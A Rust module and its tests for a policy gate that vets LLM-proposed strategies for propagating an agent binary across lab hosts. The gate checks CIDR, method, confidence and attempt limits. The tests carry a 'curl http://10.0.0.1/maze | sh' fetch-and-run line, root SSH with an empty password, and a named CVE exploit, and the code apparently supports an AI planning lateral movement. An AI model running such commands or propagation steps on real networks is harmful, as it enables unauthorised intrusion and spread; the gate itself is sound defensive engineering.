use std::net::Ipv4Addr;

use crate::types::{
    ArtifactType, BootstrapAction, PolicyDecision, PolicyRejectionReason, PropagationMethod,
    PropagationMethodClass, PropagationStrategy, RejectedStrategy,
};

pub const MAX_ATTEMPTS: u8 = 6;
pub const MIN_CONFIDENCE: f32 = 0.7;

/// All policy decisions are made here before any bootstrap execution.
///
/// The gate is checked after each LLM response. A rejected strategy is
/// converted into a `RejectedStrategy` and appended to the next
/// `DiscoveryQuery.rejected_strategies` so the LLM cannot re-propose it.
pub struct PolicyGate {
    pub allowed_methods: Vec<PropagationMethodClass>,
    pub allowed_artifact_types: Vec<ArtifactType>,
    /// Allowed target CIDRs. Empty means all targets are blocked.
    pub allowed_cidrs: Vec<(Ipv4Addr, u8)>,
    pub min_confidence: f32,
    pub max_attempts: u8,
    /// Exploit-class methods are disabled by default; must be explicitly enabled.
    pub exploit_enabled: bool,
}

impl PolicyGate {
    /// Default lab policy — conservative, exploit and Custom disabled, no CIDRs pre-loaded.
    ///
    /// `Custom` is excluded from allowed methods because free-form shell must not be
    /// the default. Enable it explicitly in lab configuration when required.
    /// Caller must also configure `allowed_cidrs` before use.
    pub fn lab_default() -> Self {
        Self {
            allowed_methods: vec![
                PropagationMethodClass::Ssh,
                PropagationMethodClass::Http,
                PropagationMethodClass::NoPath,
            ],
            allowed_artifact_types: vec![
                ArtifactType::AgentBinary,
                ArtifactType::Script,
                ArtifactType::HttpRequest,
                ArtifactType::None,
            ],
            allowed_cidrs: vec![],
            min_confidence: MIN_CONFIDENCE,
            max_attempts: MAX_ATTEMPTS,
            exploit_enabled: false,
        }
    }

    /// Evaluate a strategy before execution.
    ///
    /// Returns `PolicyDecision::Accepted` only when every check passes.
    /// The returned decision should be recorded in `LlmAttemptEvidence`.
    ///
    /// `attempt_number` is one-based: first attempt is 1, last valid is `max_attempts`.
    pub fn evaluate(
        &self,
        strategy: &PropagationStrategy,
        target: Ipv4Addr,
        attempt_number: u8,
    ) -> PolicyDecision {
        if attempt_number > self.max_attempts {
            return PolicyDecision::Rejected {
                reason: PolicyRejectionReason::MaxAttemptsExceeded,
                rule: format!("max_attempts={}", self.max_attempts),
            };
        }

        if strategy.confidence < self.min_confidence {
            return PolicyDecision::Rejected {
                reason: PolicyRejectionReason::ConfidenceBelowThreshold,
                rule: format!("min_confidence={}", self.min_confidence),
            };
        }

        if !self.is_target_allowed(target) {
            return PolicyDecision::Rejected {
                reason: PolicyRejectionReason::TargetOutsideAllowedCidr,
                rule: "allowed_cidrs".to_string(),
            };
        }

        let method_class = method_class_of(&strategy.method);

        if matches!(method_class, PropagationMethodClass::Exploit) && !self.exploit_enabled {
            return PolicyDecision::Rejected {
                reason: PolicyRejectionReason::ExploitNotEnabledForLabMode,
                rule: "exploit_enabled=false".to_string(),
            };
        }

        if !self.allowed_methods.contains(&method_class) {
            return PolicyDecision::Rejected {
                reason: PolicyRejectionReason::MethodNotAllowed,
                rule: format!("allowed_methods={:?}", self.allowed_methods),
            };
        }

        if !self
            .allowed_artifact_types
            .contains(&strategy.artifact_type)
        {
            return PolicyDecision::Rejected {
                reason: PolicyRejectionReason::ArtifactTypeNotAllowed,
                rule: format!("allowed_artifact_types={:?}", self.allowed_artifact_types),
            };
        }

        if let Some(plan) = &strategy.bootstrap_plan {
            if !self.validate_secret_refs(plan) {
                return PolicyDecision::Rejected {
                    reason: PolicyRejectionReason::InvalidSecretReference,
                    rule: "secret_ref.key_id must be non-empty; raw key material must not appear \
                           in the strategy contract"
                        .to_string(),
                };
            }
        }

        PolicyDecision::Accepted
    }

    /// Validate secret references in a bootstrap plan.
    ///
    /// Every `ScpPullFromSource` step must carry a valid `SecretRef` (non-empty
    /// `key_id`). Raw key material — PEM, credentials, API tokens — cannot exist
    /// in the strategy contract after `ephemeral_private_key_pem` was replaced with
    /// `SecretRef`; the type system enforces that invariant. This check is a
    /// defence-in-depth guard on reference integrity: an empty `key_id` means the
    /// executor has no reference to resolve and the step must not execute.
    fn validate_secret_refs(&self, plan: &crate::types::BootstrapPlan) -> bool {
        plan.steps.iter().all(|step| match &step.action {
            BootstrapAction::ScpPullFromSource { secret_ref, .. } => !secret_ref.key_id.is_empty(),
            _ => true,
        })
    }

    /// Build a `RejectedStrategy` record to feed back into the next LLM query.
    pub fn into_rejection_record(
        &self,
        strategy: &PropagationStrategy,
        attempt_number: u8,
        decision: &PolicyDecision,
    ) -> Option<RejectedStrategy> {
        let PolicyDecision::Rejected { reason, rule } = decision else {
            return None;
        };
        Some(RejectedStrategy {
            attempt_number,
            method_class: method_class_of(&strategy.method),
            rejection_reason: reason.clone(),
            policy_rule: rule.clone(),
            summary: strategy.reasoning_summary.clone(),
        })
    }

    fn is_target_allowed(&self, target: Ipv4Addr) -> bool {
        if self.allowed_cidrs.is_empty() {
            return false;
        }
        let target_u32 = u32::from(target);
        self.allowed_cidrs.iter().any(|(network, prefix)| {
            let mask = if *prefix == 0 {
                0u32
            } else {
                !0u32 << (32 - prefix)
            };
            (target_u32 & mask) == (u32::from(*network) & mask)
        })
    }
}

fn method_class_of(method: &PropagationMethod) -> PropagationMethodClass {
    match method {
        PropagationMethod::Ssh { .. } => PropagationMethodClass::Ssh,
        PropagationMethod::Http { .. } => PropagationMethodClass::Http,
        PropagationMethod::Exploit { .. } => PropagationMethodClass::Exploit,
        PropagationMethod::Custom { .. } => PropagationMethodClass::Custom,
        PropagationMethod::NoPath { .. } => PropagationMethodClass::NoPath,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::{
        ArtifactType, BootstrapPlan, BootstrapStep, ExpectedResult, PropagationMethod,
        PropagationStrategy, SecretRef, SecretSource,
    };
    use std::net::Ipv4Addr;

    fn strategy(method: PropagationMethod, confidence: f32) -> PropagationStrategy {
        PropagationStrategy {
            method,
            artifact_type: ArtifactType::None,
            bootstrap_plan: None,
            confidence,
            reasoning_summary: String::new(),
            preconditions: vec![],
            validation_check: None,
            safety_notes: vec![],
        }
    }

    fn gate_with_cidr(cidr: &str) -> PolicyGate {
        let (ip_str, prefix_str) = cidr.split_once('/').unwrap();
        let ip: Ipv4Addr = ip_str.parse().unwrap();
        let prefix: u8 = prefix_str.parse().unwrap();
        PolicyGate {
            allowed_cidrs: vec![(ip, prefix)],
            ..PolicyGate::lab_default()
        }
    }

    fn scp_pull_step(key_id: &str) -> BootstrapStep {
        BootstrapStep {
            action: BootstrapAction::ScpPullFromSource {
                source_ip: "10.0.0.1".into(),
                source_path: "/tmp/physarum-maze".into(),
                dest_path: "/tmp/physarum-maze".into(),
                secret_ref: SecretRef {
                    key_id: key_id.to_string(),
                    source: SecretSource::RuntimeGenerated,
                },
            },
            target: "10.0.0.2".into(),
            timeout_ms: 5000,
            requires_root: false,
            expected_result: ExpectedResult {
                success_indicator: "exit 0".into(),
                failure_indicator: None,
            },
        }
    }

    #[test]
    fn accepts_ssh_within_cidr_above_threshold() {
        let gate = gate_with_cidr("10.0.0.0/8");
        let s = strategy(
            PropagationMethod::Ssh {
                user: "root".into(),
                auth: crate::types::SshAuth::EmptyPassword,
            },
            0.9,
        );
        assert!(matches!(
            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 1),
            PolicyDecision::Accepted
        ));
    }

    #[test]
    fn rejects_exploit_when_disabled() {
        let gate = gate_with_cidr("10.0.0.0/8");
        let s = strategy(
            PropagationMethod::Exploit {
                cve: "CVE-2021-41773".into(),
            },
            0.95,
        );
        assert!(matches!(
            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 1),
            PolicyDecision::Rejected {
                reason: PolicyRejectionReason::ExploitNotEnabledForLabMode,
                ..
            }
        ));
    }

    #[test]
    fn rejects_when_target_outside_cidr() {
        let gate = gate_with_cidr("10.0.0.0/8");
        let s = strategy(
            PropagationMethod::Ssh {
                user: "root".into(),
                auth: crate::types::SshAuth::EmptyPassword,
            },
            0.9,
        );
        assert!(matches!(
            gate.evaluate(&s, "192.168.1.1".parse().unwrap(), 1),
            PolicyDecision::Rejected {
                reason: PolicyRejectionReason::TargetOutsideAllowedCidr,
                ..
            }
        ));
    }

    #[test]
    fn rejects_when_max_attempts_exceeded() {
        let gate = gate_with_cidr("10.0.0.0/8");
        let s = strategy(
            PropagationMethod::Ssh {
                user: "root".into(),
                auth: crate::types::SshAuth::EmptyPassword,
            },
            0.9,
        );
        // attempt_number is one-based; MAX_ATTEMPTS (6) is the last valid attempt.
        // MAX_ATTEMPTS + 1 (7) must be rejected.
        assert!(matches!(
            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), MAX_ATTEMPTS + 1),
            PolicyDecision::Rejected {
                reason: PolicyRejectionReason::MaxAttemptsExceeded,
                ..
            }
        ));
    }

    #[test]
    fn accepts_last_valid_attempt_number() {
        let gate = gate_with_cidr("10.0.0.0/8");
        let s = strategy(
            PropagationMethod::Ssh {
                user: "root".into(),
                auth: crate::types::SshAuth::EmptyPassword,
            },
            0.9,
        );
        // Attempt 6 (== max_attempts) must still be accepted.
        assert!(matches!(
            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), MAX_ATTEMPTS),
            PolicyDecision::Accepted
        ));
    }

    #[test]
    fn rejects_below_confidence_threshold() {
        let gate = gate_with_cidr("10.0.0.0/8");
        let s = strategy(
            PropagationMethod::Ssh {
                user: "root".into(),
                auth: crate::types::SshAuth::EmptyPassword,
            },
            0.5,
        );
        assert!(matches!(
            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 1),
            PolicyDecision::Rejected {
                reason: PolicyRejectionReason::ConfidenceBelowThreshold,
                ..
            }
        ));
    }

    #[test]
    fn rejects_custom_method_by_default() {
        let gate = gate_with_cidr("10.0.0.0/8");
        let s = strategy(
            PropagationMethod::Custom {
                description: "curl http://10.0.0.1/maze | sh".into(),
            },
            0.9,
        );
        assert!(matches!(
            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 1),
            PolicyDecision::Rejected {
                reason: PolicyRejectionReason::MethodNotAllowed,
                ..
            }
        ));
    }

    #[test]
    fn accepts_scp_pull_with_valid_secret_ref() {
        let gate = gate_with_cidr("10.0.0.0/8");
        let mut s = strategy(
            PropagationMethod::Ssh {
                user: "root".into(),
                auth: crate::types::SshAuth::PrivateKey,
            },
            0.9,
        );
        s.bootstrap_plan = Some(BootstrapPlan {
            steps: vec![scp_pull_step("sha256:abc123")],
        });
        assert!(matches!(
            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 1),
            PolicyDecision::Accepted
        ));
    }

    #[test]
    fn rejects_scp_pull_with_empty_key_id() {
        let gate = gate_with_cidr("10.0.0.0/8");
        let mut s = strategy(
            PropagationMethod::Ssh {
                user: "root".into(),
                auth: crate::types::SshAuth::PrivateKey,
            },
            0.9,
        );
        // Empty key_id means the executor has no reference to resolve —
        // the step must be rejected before execution.
        s.bootstrap_plan = Some(BootstrapPlan {
            steps: vec![scp_pull_step("")],
        });
        assert!(matches!(
            gate.evaluate(&s, "10.0.1.5".parse().unwrap(), 1),
            PolicyDecision::Rejected {
                reason: PolicyRejectionReason::InvalidSecretReference,
                ..
            }
        ));
    }
}
